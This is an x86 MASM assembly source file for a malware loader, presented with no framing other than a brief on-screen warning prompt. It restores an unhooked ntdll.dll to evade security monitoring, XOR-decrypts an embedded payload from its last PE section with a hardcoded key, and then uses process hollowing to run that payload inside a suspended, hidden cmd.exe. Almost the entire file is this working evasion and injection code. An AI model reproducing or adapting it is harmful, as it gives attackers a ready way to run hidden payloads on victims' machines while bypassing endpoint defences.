.386
.model flat, stdcall
option casemap:none
include windows.inc
include user32.inc
include kernel32.inc
include ntdll.inc
include psapi.inc
includelib user32.lib
includelib kernel32.lib
includelib ntdll.lib
includelib psapi.lib

.const
BUFFER_SIZE     equ     4096
PAGE_RWX        equ     40h
FILE_SHARE_RW   equ     3h
KEY_LENGTH      equ     6

IDNO            equ     7

.data
caption_text    db      "Security Warning", 0
message_text    db      "WARNING: This process could be malicious if you don't know its origin.", 13, 10
                db      "Do you want to continue at your own risk?", 0
key             db      "SECRET"
target          db      'C:\Windows\system32\cmd.exe', 0
path_ntdll      db      "C:\Windows\System32\ntdll.dll", 0
ntdll           db      "ntdll.dll", 0

MODULEINFO STRUCT
    lpBaseOfDll LPVOID  ?
    SizeOfImage DWORD   ?
    EntryPoint  LPVOID  ?
MODULEINFO ENDS


.code

CopyMemory PROC uses edi esi ecx dest:DWORD, src:DWORD, len:DWORD
    mov edi, dest
    mov esi, src
    mov ecx, len
    rep movsb
    ret
CopyMemory ENDP

rehook PROC uses ax eax
    LOCAL baseAddr:DWORD
    LOCAL fileHandle:HANDLE
    LOCAL mappingHandle:HANDLE
    LOCAL moduleHandle:DWORD
    LOCAL moduleInfo:MODULEINFO
    LOCAL tempNtdll:DWORD
    LOCAL mappingAddress:DWORD
    LOCAL headerAddr:DWORD
    LOCAL dosHeaderAddr:DWORD
    LOCAL numSections:WORD
    LOCAL sectionOffset:DWORD
    LOCAL virtAddr:DWORD
    LOCAL virtSize:DWORD
    LOCAL procHandle:HANDLE
    LOCAL oldProtect:DWORD
    LOCAL virtAddrMapped:DWORD

    invoke GetModuleHandle, addr ntdll
    mov moduleHandle, eax

    invoke GetCurrentProcess
    mov procHandle, eax

    invoke GetModuleInformation, procHandle, moduleHandle, addr moduleInfo, sizeof moduleInfo
    mov tempNtdll, eax

    mov eax, moduleInfo.lpBaseOfDll
    mov baseAddr, eax

    invoke CreateFileA, addr path_ntdll, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
    mov fileHandle, eax

    invoke CreateFileMappingA, fileHandle, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL
    mov mappingHandle, eax

    invoke MapViewOfFile, mappingHandle, FILE_MAP_READ, 0, 0, 0
    mov mappingAddress, eax

    ; DOS MZ Header
    mov eax, mappingAddress
    mov ebx, [eax + 3Ch]             ; +3C  (60) DWORD e_lfanew File address of new exe header
    add eax, ebx
    mov headerAddr, eax

    ; Section Headers
    mov eax, headerAddr
    add eax, 0F8h                    ; +F8  (248) Start of Section Headers
    mov sectionOffset, eax

    mov eax, [mappingAddress]
    add eax, ebx
    mov ax, [eax + 6h]              ; +06  (6) WORD Number of Sections
    mov numSections, ax

    mov ebx, baseAddr
    mov eax, sectionOffset
    mov eax, [eax + 0Ch]            ; +0C  (12) DWORD VirtualAddress
    add eax, ebx
    mov virtAddr, eax

    mov eax, sectionOffset
    add eax, 8                      ; +08  (8) DWORD PhysicalAddress/VirtualSize
    mov eax, [eax]
    mov virtSize, eax

    mov ebx, mappingAddress
    mov eax, sectionOffset
    mov eax, [eax + 0Ch]            ; +0C  (12) DWORD VirtualAddress
    add eax, ebx
    mov virtAddrMapped, eax

    mov eax, 0
    mov oldProtect, eax

    invoke VirtualProtect, virtAddr, virtSize, PAGE_EXECUTE_READWRITE, addr oldProtect
    invoke CopyMemory, virtAddr, virtAddrMapped, virtSize
    invoke VirtualProtect, virtAddr, virtSize, oldProtect, addr oldProtect

    ret
rehook ENDP

getPE PROC uses eax ebx esi edi payload:DWORD
    LOCAL fileAddress:DWORD
    LOCAL imageBase:DWORD
    LOCAL newImageBase:DWORD
    LOCAL sectionOffset:DWORD
    LOCAL virtualAddress:DWORD
    LOCAL sizeOfRawData:DWORD
    LOCAL pointerToRawData:DWORD
    LOCAL numberOfSections:WORD
    LOCAL pointerToRawCalc:DWORD
    LOCAL sizeOfImage:DWORD
    LOCAL EntryPoint:DWORD
    LOCAL sizeOfHeaders:DWORD
    LOCAL rvaAddress:DWORD
    LOCAL context:CONTEXT
    LOCAL start_info:STARTUPINFO
    LOCAL process_info:PROCESS_INFORMATION
    
    mov ebx, payload 
    
    ; DOS MZ Header
    mov eax, [ebx + 3Ch]              ; +3C  (60) DWORD e_lfanew File address of new exe header
    mov fileAddress, eax
    
    ; PE Header starts at e_lfanew
    mov eax, fileAddress
    add eax, ebx
    add eax, 6                        ; +06  (6) WORD Number of Sections
    movzx eax, word ptr [eax]
    mov numberOfSections, ax
    
    ; Optional Header
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 28h]              ; +28  (40) DWORD AddressOfEntryPoint
    mov EntryPoint, eax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 34h]              ; +34  (52) DWORD ImageBase
    mov imageBase, eax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 50h]              ; +50  (80) DWORD SizeOfImage
    mov sizeOfImage, eax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 54h]              ; +54  (84) DWORD SizeOfHeaders
    mov sizeOfHeaders, eax
    
    ; Section Headers start at +F8h from PE Header
    mov eax, fileAddress
    add eax, 0F8h                     ; +F8  (248) Section Header start
    mov sectionOffset, eax 

    invoke RtlZeroMemory, addr start_info, sizeof start_info
    invoke RtlZeroMemory, addr process_info, sizeof process_info
    invoke CreateProcess, addr target, NULL, NULL, NULL, FALSE, \
           CREATE_SUSPENDED or CREATE_NO_WINDOW, NULL, NULL, \
           addr start_info, addr process_info
    test eax, eax
    jz process_error
    
    mov context.ContextFlags, CONTEXT_FULL
    invoke GetThreadContext, process_info.hThread, addr context
    
    invoke VirtualAllocEx, process_info.hProcess, imageBase, \
           sizeOfImage, MEM_COMMIT + MEM_RESERVE, PAGE_RWX
    mov newImageBase, eax
    test eax, eax
    jz process_error
    
    invoke WriteProcessMemory, process_info.hProcess, newImageBase, \
           payload, sizeOfHeaders, NULL
    
    ; Process Section Headers
    xor si, si
    .repeat 
        mov ebx, payload
        mov eax, sectionOffset
        add eax, ebx
        
        push eax
        mov eax, [eax + 0Ch]          ; +0C  (12) DWORD VirtualAddress
        mov rvaAddress, eax
        pop eax
        
        push eax
        mov eax, [eax + 10h]          ; +10  (16) DWORD SizeOfRawData
        mov sizeOfRawData, eax
        pop eax
        
        mov eax, [eax + 14h]          ; +14  (20) DWORD PointerToRawData
        mov pointerToRawData, eax
        
        mov eax, pointerToRawData
        add eax, ebx
        mov pointerToRawCalc, eax
        
        mov ecx, newImageBase
        add ecx, rvaAddress
        mov virtualAddress, ecx
        
        invoke WriteProcessMemory, process_info.hProcess, ecx, \
               pointerToRawCalc, sizeOfRawData, NULL
       
        inc si
        add sectionOffset, 28h         ; +28  (40) Size of Section Header
    .until si == numberOfSections
    
    mov edi, context.regEbx
    add edi, 8
    invoke WriteProcessMemory, process_info.hProcess, edi, \
           addr newImageBase, 4, NULL
           
    mov ebx, newImageBase
    add ebx, EntryPoint
    mov context.regEax, ebx
    
    invoke SetThreadContext, process_info.hThread, addr context
    invoke ResumeThread, process_info.hThread
    
process_error:
    ret
getPE endp

ProcessSection PROC uses eax esi edi ebx section:DWORD, size_var:DWORD, outBuffer:DWORD
    LOCAL currentPos:DWORD
    LOCAL remainingBytes:DWORD
    LOCAL currentChunk:DWORD
    LOCAL keyIndex:DWORD
    LOCAL bytesProcessed:DWORD
    LOCAL buffer[4096]:BYTE          
    
    mov esi, section
    mov keyIndex, 0
    mov eax, size_var
    mov remainingBytes, eax
    mov eax, outBuffer
    mov currentPos, eax
    mov bytesProcessed, 0
    
    .while remainingBytes > 0
        mov eax, remainingBytes
        .if eax > 4096              
            mov eax, 4096
        .endif
        mov currentChunk, eax
        
        mov edx, keyIndex
        mov ecx, currentChunk
        lea edi, buffer
        
        .while ecx > 0
            mov al, [esi]
            xor al, byte ptr key[edx]
            mov [edi], al
            
            inc esi
            inc edi
            inc edx
            .if edx >= 6            
                xor edx, edx
            .endif
            dec ecx
        .endw
        
        mov keyIndex, edx
        
        invoke CopyMemory, currentPos, addr buffer, currentChunk
        
        mov eax, currentChunk
        add currentPos, eax
        add bytesProcessed, eax
        sub remainingBytes, eax
    .endw
    ret
ProcessSection ENDP

start PROC
    LOCAL hModule:DWORD
    LOCAL sectionData:DWORD
    LOCAL sectionSize:DWORD
    LOCAL execMemory:DWORD
    LOCAL hFile:HANDLE
    invoke MessageBox, NULL, addr message_text, addr caption_text, \
           MB_YESNO or MB_ICONWARNING
    
    cmp eax, IDNO
    je exit_error
    
    
    invoke rehook
    xor ebx, ebx
    
    invoke GetModuleHandleA, NULL
    mov hModule, eax
    test eax, eax
    jz exit_error
    
    mov ebx, eax
    
    ; DOS MZ Header
    mov ax, word ptr [ebx]            ; +00  (0) WORD e_magic Magic number MZ (5A4D)
    cmp ax, 5A4Dh
    jne exit_error
    
    mov edx, [ebx + 3Ch]             ; +3C  (60) DWORD e_lfanew File address of new exe header
    add edx, ebx
    
    ; PE Header
    mov eax, [edx]                   ; +00  (0) DWORD Signature PE (00004550h)
    cmp eax, 00004550h
    jne exit_error
    
    mov ax, [edx + 6]                ; +06  (6) WORD Number of Sections
    test ax, ax
    jz exit_error
    
    movzx ecx, ax
    dec ecx
    
    ; Section Headers
    add edx, 0F8h                    ; +F8  (248) Start of Section Headers
    imul eax, ecx, 28h               ; +28  (40) Size of Section Header
    add edx, eax
    
    mov eax, [edx + 0Ch]             ; +0C  (12) DWORD VirtualAddress
    add eax, hModule
    mov sectionData, eax
    
    mov eax, [edx + 10h]             ; +10  (16) DWORD SizeOfRawData
    mov sectionSize, eax
    
    invoke VirtualAlloc, NULL, sectionSize, \
           MEM_COMMIT or MEM_RESERVE, PAGE_RWX
    mov execMemory, eax
    
    invoke ProcessSection, sectionData, sectionSize, execMemory
    invoke CloseHandle, hFile
    invoke getPE, execMemory
    invoke VirtualFree, execMemory, 0, MEM_RELEASE
    
exit_error:
    invoke ExitProcess, 0
    
start ENDP
END start